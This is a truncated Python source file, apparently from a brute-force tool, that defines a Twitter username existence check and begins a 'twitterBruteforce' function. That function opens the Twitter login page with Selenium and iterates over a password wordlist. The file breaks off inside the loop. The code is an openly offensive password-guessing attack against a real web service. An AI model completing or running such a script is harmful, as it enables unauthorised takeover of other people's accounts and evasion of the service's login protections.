# -*- coding: utf-8 -*-
from selenium import webdriver
import mechanize
from time import sleep
import sys


def twitUserCheck(username):
    try:
        driver = webdriver.Firefox()
        driver.get("https://twitter.com/" + username)
        assert (("Sorry, that page doesn’t exist!") not in driver.page_source)
        driver.close()
    except AssertionError:
        return 1

def twitterBruteforce(username, wordlist, delay):
    driver = webdriver.Firefox()
    driver.get("https://twitter.com/login")
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            
